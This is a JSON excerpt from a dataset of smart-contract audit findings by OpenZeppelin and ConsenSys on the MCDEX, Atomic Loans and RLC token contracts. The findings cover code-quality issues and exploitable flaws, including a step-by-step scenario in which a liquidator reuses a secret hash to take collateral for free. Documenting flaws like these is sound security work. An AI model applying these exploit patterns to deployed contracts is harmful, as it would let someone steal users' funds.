      "content": "The `Perpetual` contract has a [public `liquidateFrom` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L270) that bypasses the checks in the [`liquidate` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L291).\n\n\nThis means that it can be called to liquidate a position when the contract is in the `SETTLED` state. Additionally, any user can set an arbitrary `from` address, causing a third-party user to confiscate the under-collateralized trader’s position. This means that any trader can unilaterally rearrange another account’s position. They could also liquidate on behalf of the [Perpetual Proxy](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/proxy/PerpetualProxy.sol), which could break some of the [Automated Market Maker](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol) invariants, such as the condition that it only holds `LONG` positions.\n\n\nConsider restricting `liquidateFrom` to `internal` visibility.\n\n\n**Update:** *Fixed. The `liquidateFrom` function has been removed.*",
      "summary": "\nThis bug report is about a contract called `Perpetual`, which has a public function called `liquidateFrom`. This function allows users to liquidate a position when the contract is in the `SETTLED` state, and also allows users to set an arbitrary `from` address, potentially allowing a third-party user to confiscate the position of an under-collateralized trader. It also has the potential to break some of the Automated Market Maker invariants, like the condition that it only holds `LONG` positions. \n\nThe solution proposed was to restrict the `liquidateFrom` function to `internal` visibility. This issue has now been fixed, and the `liquidateFrom` function has been removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "14003",
      "title": "Funds.update() lets users update fields that may not have any effect ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [AtomicLoans/atomicloans-eth-contracts#67](https://github.com/AtomicLoans/atomicloans-eth-contracts/pull/67).\n\n\n#### Description\n\n\n`Funds.update()` allows users to update the following fields which are only used if `bools[fund].custom` is set:\n\n\n* `minLoanamt`\n* `maxLoanAmt`\n* `minLoanDur`\n* `interest`\n* `penalty`\n* `fee`\n* `liquidationRatio`\n\n\nIf `bools[fund].custom` is not set, then these changes have no effect. This may be misleading to users.\n\n\n#### Examples\n\n\n**code/ethereum/contracts/Funds.sol:L454-L478**\n\n\n\n```\nfunction update(\n    bytes32  fund,\n    uint256  minLoanAmt\\_,\n    uint256  maxLoanAmt\\_,\n    uint256  minLoanDur\\_,\n    uint256  maxLoanDur\\_,\n    uint256  maxFundDur\\_,\n    uint256  interest\\_,\n    uint256  penalty\\_,\n    uint256  fee\\_,\n    uint256  liquidationRatio\\_,\n    address  arbiter\\_\n) external {\n    require(msg.sender == lender(fund));\n    funds[fund].minLoanAmt       = minLoanAmt\\_;\n    funds[fund].maxLoanAmt       = maxLoanAmt\\_;\n    funds[fund].minLoanDur       = minLoanDur\\_;\n    funds[fund].maxLoanDur       = maxLoanDur\\_;\n    funds[fund].maxFundDur       = maxFundDur\\_;\n    funds[fund].interest         = interest\\_;\n    funds[fund].penalty          = penalty\\_;\n    funds[fund].fee              = fee\\_;\n    funds[fund].liquidationRatio = liquidationRatio\\_;\n    funds[fund].arbiter          = arbiter\\_;\n}\n\n```\n#### Recommendation\n\n\nThis could be addressed by creating two update functions: one for custom funds and one for non-custom funds. Only the update for custom funds would allow setting these values.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Atomic Loans",
      "source_link": "https://consensys.net/diligence/audits/2019/09/atomic-loans/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx\n"
      ]
    },
    {
      "id": "14002",
      "title": "In Funds, maxFundDur is misnamed ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [AtomicLoans/atomicloans-eth-contracts#66](https://github.com/AtomicLoans/atomicloans-eth-contracts/pull/66).\n\n\n#### Description\n\n\nThis is a timestamp, not a duration.\n\n\n#### Recommendation\n\n\nRename to something with “timestamp” or perhaps “expiration” in the name.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Atomic Loans",
      "source_link": "https://consensys.net/diligence/audits/2019/09/atomic-loans/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx\n"
      ]
    },
    {
      "id": "14001",
      "title": "Funds.maxFundDur has no effect if maxLoanDur is set ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis is fixed in [AtomicLoans/atomicloans-eth-contracts#68](https://github.com/AtomicLoans/atomicloans-eth-contracts/pull/68).\n\n\n#### Description\n\n\n`Funds.maxFundDur` specifies the maximum amount of time a fund should be active. It’s checked in `request()` to ensure the duration of the loan won’t exceed that time, but the check is skipped if `maxLoanDur` is set:\n\n\n**code/ethereum/contracts/Funds.sol:L510-L514**\n\n\n\n```\nif (maxLoanDur(fund) > 0) {\n    require(loanDur\\_       <= maxLoanDur(fund));\n} else {\n    require(now + loanDur\\_ <= maxFundDur(fund));\n}\n\n```\n#### Examples\n\n\nIf a user sets `maxLoanDur` (the maximum loan duration) to 1 week and sets the `maxFundDur` (timestamp when all loans should be complete) to December 1st, then there can actually be a loan that ends on December 7th.\n\n\n#### Recommendation\n\n\nCheck against `maxFundDur` even when `maxLoanDur` is set.",
      "summary": "\nThis bug report is about the `Funds.maxFundDur` feature in the AtomicLoans/atomicloans-eth-contracts repository. This feature should specify the maximum amount of time a fund should be active, and is checked in the `request()` function to ensure the duration of the loan won't exceed that time. However, when the `maxLoanDur` parameter is set, the check is skipped. \n\nFor example, if a user sets `maxLoanDur` to 1 week and sets the `maxFundDur` to December 1st, then there can actually be a loan that ends on December 7th.\n\nThe resolution for this bug is to check against `maxFundDur` even when `maxLoanDur` is set. This fix is available in the [AtomicLoans/atomicloans-eth-contracts#68](https://github.com/AtomicLoans/atomicloans-eth-contracts/pull/68) pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Atomic Loans",
      "source_link": "https://consensys.net/diligence/audits/2019/09/atomic-loans/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx\n"
      ]
    },
    {
      "id": "14000",
      "title": "There is no way to convert between custom and non-custom funds  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nUsers who want to switch between custom and non-custom funds can create a new address to do so. This is not actually a big burden because lenders need to use agent software to manage their funds anyway. That workflow typically involves generating a new address because the private key needs to be given to the agent software.\n\n\n#### Description\n\n\nEach fund is created using either `Funds.create()` or `Funds.createCustom()`. Both enforce a limitation that there can only be one fund per account:\n\n\n**code/ethereum/contracts/Funds.sol:L348-L355**\n\n\n\n```\nfunction create(\n    uint256  maxLoanDur\\_,\n    uint256  maxFundDur\\_,\n    address  arbiter\\_,\n    bool     compoundEnabled\\_,\n    uint256  amount\\_\n) external returns (bytes32 fund) {\n    require(fundOwner[msg.sender].lender != msg.sender || msg.sender == deployer); // Only allow one loan fund per address\n\n```\n**code/ethereum/contracts/Funds.sol:L383-L397**\n\n\n\n```\nfunction createCustom(\n    uint256  minLoanAmt\\_,\n    uint256  maxLoanAmt\\_,\n    uint256  minLoanDur\\_,\n    uint256  maxLoanDur\\_,\n    uint256  maxFundDur\\_,\n    uint256  liquidationRatio\\_,\n    uint256  interest\\_,\n    uint256  penalty\\_,\n    uint256  fee\\_,\n    address  arbiter\\_,\n    bool     compoundEnabled\\_,\n    uint256  amount\\_\n) external returns (bytes32 fund) {\n    require(fundOwner[msg.sender].lender != msg.sender || msg.sender == deployer); // Only allow one loan fund per address\n\n```\nThese functions are the only place where `bools[fund].custom` is set, and there’s no way to delete a fund once it exists. This means there’s no way for a given account to switch between a custom and non-custom fund.\n\n\nThis could be a problem if, for example, the default parameters change in a way that a user finds unappealing. They may want to switch to using a custom fund but find themselves unable to do so without moving to a new Ethereum account.\n\n\n#### Recommendation\n\n\nEither allow funds to be deleted or allow funds to be switched between custom and non-custom.",
      "summary": "\nA bug was reported in the code of Funds.sol, which is a part of the Ethereum network. The issue is that users cannot switch between a custom and non-custom fund without creating a new Ethereum account. This is because the code only allows one fund per account and does not provide a way to delete a fund once it exists. Therefore, users who want to switch between custom and non-custom funds must create a new address to do so. This bug could be a problem for users if the default parameters change in a way that they find unappealing. The recommendation is to either allow funds to be deleted or allow funds to be switched between custom and non-custom.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Atomic Loans",
      "source_link": "https://consensys.net/diligence/audits/2019/09/atomic-loans/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx\n"
      ]
    },
    {
      "id": "13999",
      "title": "Intentional secret reuse can block borrower and lender from accepting liquidation payment ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis is fixed in [AtomicLoans/atomicloans-eth-contracts#65](https://github.com/AtomicLoans/atomicloans-eth-contracts/pull/65).\n\n\n#### Description\n\n\nFor Dave (the liquidator) to claim the collateral he’s purchasing, he must reveal secret D. Once that secret is revealed, Alice and Bob (the borrower and lender) can claim the payment.\n\n\nSecrets must be provided via the `Sales.provideSecret()` function:\n\n\n**code/ethereum/contracts/Sales.sol:L193-L200**\n\n\n\n```\n\tfunction provideSecret(bytes32 sale, bytes32 secret\\_) external {\n\t\trequire(sales[sale].set);\n\t\tif      (sha256(abi.encodePacked(secret\\_)) == secretHashes[sale].secretHashA) { secretHashes[sale].secretA = secret\\_; }\n        else if (sha256(abi.encodePacked(secret\\_)) == secretHashes[sale].secretHashB) { secretHashes[sale].secretB = secret\\_; }\n        else if (sha256(abi.encodePacked(secret\\_)) == secretHashes[sale].secretHashC) { secretHashes[sale].secretC = secret\\_; }\n        else if (sha256(abi.encodePacked(secret\\_)) == secretHashes[sale].secretHashD) { secretHashes[sale].secretD = secret\\_; }\n        else                                                                          { revert(); }\n\t}\n\n```\nNote that if Dave chooses the same secret hash as either Alice, Bob, or Charlie (arbiter), there is no way to set `secretHashes[sale].secretD` because one of the earlier conditionals will execute.\n\n\nFor Alice and Bob to later receive payment, they must be able to provide Dave’s secret:\n\n\n**code/ethereum/contracts/Sales.sol:L218-L222**\n\n\n\n```\n\tfunction accept(bytes32 sale) external {\n        require(!accepted(sale));\n        require(!off(sale));\n\t\trequire(hasSecrets(sale));\n\t\trequire(sha256(abi.encodePacked(secretHashes[sale].secretD)) == secretHashes[sale].secretHashD);\n\n```\nDave can exploit this to obtain the collateral for free:\n\n\n1. Dave looks at Alice’s secret hashes to see which will be used in the sale.\n2. Dave begins the liquidation process, using the same secret hash.\n3. Alice and Bob reveal their secrets A and B through the process of moving the collateral.\n4. Dave now knows the preimage for the secret hash he provided. It was revealed by Alice already.\n5. Dave uses that secret to obtain the collateral.\n6. Alice and Bob now want to receive payment, but they’re unable to provide Dave’s secret to the `Sales` smart contract due to the order of conditionals in `provideSecret()`.\n7. After an expiration, Dave can claim a refund.\n\n\n#### Mitigating factors\n\n\nAlice and Bob *could* notice that Dave chose a duplicate secret hash and refuse to proceed with the sale. This is not something they are likely to do.\n\n\n#### Recommendation\n\n\nEither change the way `provideSecret()` works to allow for duplicate secret hashes or reject duplicate hashes in `create()`.",
      "summary": "\nThis bug report is about a vulnerability in the Sales smart contract of the AtomicLoans platform. The vulnerability allows Dave, the liquidator, to exploit the contract and obtain the collateral for free. This is done by Dave choosing the same secret hash as either Alice, Bob, or Charlie (arbiter) and then Alice and Bob revealing their secrets A and B through the process of moving the collateral. Dave then uses that secret to obtain the collateral, and Alice and Bob are unable to provide Dave’s secret to the `Sales` smart contract due to the order of conditionals in `provideSecret()`. \n\nThe resolution for this bug is fixed in [AtomicLoans/atomicloans-eth-contracts#65](https://github.com/AtomicLoans/atomicloans-eth-contracts/pull/65). The recommendation is either changing the way `provideSecret()` works to allow for duplicate secret hashes or rejecting duplicate hashes in `create()`. The mitigating factor for this bug is that Alice and Bob could notice that Dave chose a duplicate secret hash and refuse to proceed with the sale, however, this is not something they are likely to do.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Atomic Loans",
      "source_link": "https://consensys.net/diligence/audits/2019/09/atomic-loans/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx\n"
      ]
    },
    {
      "id": "12131",
      "title": "Fail early and loudly",
      "impact": "LOW",
      "content": "A simple yet powerful programming good practice is to [make your code fail as promptly as possible](https://oncodingstyle.blogspot.com.ar/2008/10/fail-early-fail-loudly.html). And be loud about it. We want to avoid a contract failing silently, or continuing execution in an unstable or inconsistent state. Consider changing all precondition checks to `throw`ing to follow [this good practice](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/CONTRIBUTING.md#g2---code-that-fails-early). [Some parts of the code](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L25) do this correctly, but we’d like to see more consistency on this pattern.\n\n\nSome places where this could be improved are:\n\n\n* <https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Pausable.sol#L16>\n* <https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Pausable.sol#L22>\n* <https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Ownable.sol>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12130",
      "title": "Use latest version of Solidity",
      "impact": "LOW",
      "content": "[Current code](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L1) is written for an old version of solc (0.4.8). We recommend changing the solidity version pragma for the latest version (`pragma solidity ^0.4.10;`) to enforce latest compiler version to be used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12129",
      "title": "Avoid duplicated code",
      "impact": "LOW",
      "content": "Duplicate code makes it harder to understand the code’s intention and thus, auditing the code correctly. It also increases the risk of introducing hidden bugs when modifying one of the copies of some code and not the others.\n\n\nThe logic in [transfer](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L62), [transferFrom](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L69), [balanceOf](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L79), [allowance](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L97) and [approve](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L83) is very similar to the provided methods in [StandardToken](https://github.com/OpenZeppelin/zeppelin-solidity/blob/52120a8c428de5e34f157b7eaed16d38f3029e66/contracts/token/StandardToken.sol) and could be refactored to avoid repetition. There is no need to rewrite the parent’s contract logic: consider using the [super keyword](https://ethereum.stackexchange.com/questions/12920/what-does-the-keyword-super-in-solidity-do) to access StandardToken implementation of methods, like so:\n\n\n\n```\n\nfunction transfer(address _to, uint _value) onlyUnlocked returns (bool success) {\n  return super.transfer(_to, _value);\n}\n\n```\n\nFurthermore, [the burn method](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L54) is a close rewrite of **transfer**, consider having burn call transfer instead.\n\n\nFinally, Crowdsale.sol could use OpenZeppelin’s Ownable instead of [implementing the same idea](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L105).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12128",
      "title": "Unused isMaxCapReached",
      "impact": "LOW",
      "content": "[isMaxCapReached](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L209) is not used in Crowdsale.sol, but seems like it could be used in [line 186](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L186) or in [the finalize function](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L293).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12127",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol) and setting a period of time where security researchers from around the globe can try to break the contract’s invariants. For more info on how to implement automated bug bounties with OpenZeppelin, [see this guide](https://zeppelin-solidity.readthedocs.io/en/latest/bounty.html).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12126",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) in the contract code. Some examples are:\n\n\n* <https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L295>\n* <https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L148>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12125",
      "title": "Use of send",
      "impact": "LOW",
      "content": "Use of **send** is always risky and should be analyzed in detail. Two occurrences found in [line 255](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L255) and [line 297](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L297) of Crowdsale.sol.\n\n\n* [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.\n* [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): Warning. Use at line 297 could be moved down.\n* [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): line 255 is a pull payment, line 297 is a push payment. Consider changing line 297 to use asyncSend.\n\n\nFor more info on this problem, [see this note](https://github.com/ConsenSys/Ethereum-Development-Best-Practices/wiki/Fallback-functions-and-the-fundamental-limitations-of-using-send%28%29-in-Ethereum-&-Solidity#abuse).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12124",
      "title": "Timestamp usage",
      "impact": "MEDIUM",
      "content": "There’s a problem with using timestamps and **now** (alias for **block.timestamp**) for contract logic, based on the fact that miners can perform some manipulation. In general, [it’s better not to rely on timestamps for contract logic](https://github.com/ConsenSys/smart-contract-best-practices#timestamp-dependence). The solutions is to use **block.number** instead, and approximate dates with expected block heights and time periods with expected block amounts.\n\n\nThe Crowdsale.sol and RLC.sol contracts use timestamps in several places (for example, lines [69](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L69), [116](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L116), [145](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L145), and [295](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/Crowdsale.sol#L295) of Crowdsale.sol and lines [37](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L37) and [49](https://github.com/iExecBlockchainComputing/rlc-token/blob/3d9aa99ba33bb035c59740a621b1f21cd45cbac5/contracts/RLC.sol#L49) of RLC.sol). The risk of miner manipulation, though, is really low. The potential damage is also limited: miners could only slightly manipulate when crowdfunding ends and starts. We recommend the team to consider the potential risk of this manipulation and switch to **block.number** if necessary.\n\n\nFor more info on this topic, see [this stack exchange question](https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp).",
      "summary": "\nThis bug report is about the use of timestamps and **now** (alias for **block.timestamp**) in the Crowdsale.sol and RLC.sol contracts. While it is possible for miners to manipulate the timestamp, the risk is low and the potential damage is limited. It is recommended that the team consider the potential risk and switch to **block.number** if necessary.\n\nTimestamps should not be used for contract logic due to the potential for miner manipulation. Instead, **block.number** should be used to approximate dates with expected block heights and time periods with expected block amounts.\n\nMore information on this topic can be found in the GitHub repository for smart contract best practices and on a Stack Exchange question.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12123",
      "title": "Use safe math",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. It’s always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.",
      "summary": "\nThis bug report is about unchecked math operations in code. Unchecked math operations are risky and can lead to errors in the code. It is recommended to use a safe math library like the one provided by OpenZeppelin or to perform pre-condition checks on any math operation. This way, any potential issues or errors can be identified and addressed before they cause any problems. Using a safe math library or pre-condition checks can help ensure that the code is safe and secure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "iEx.ec RLC Token Audit",
      "source_link": "https://blog.openzeppelin.com/iex-ec-rlc-token-audit-80abd763709b/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}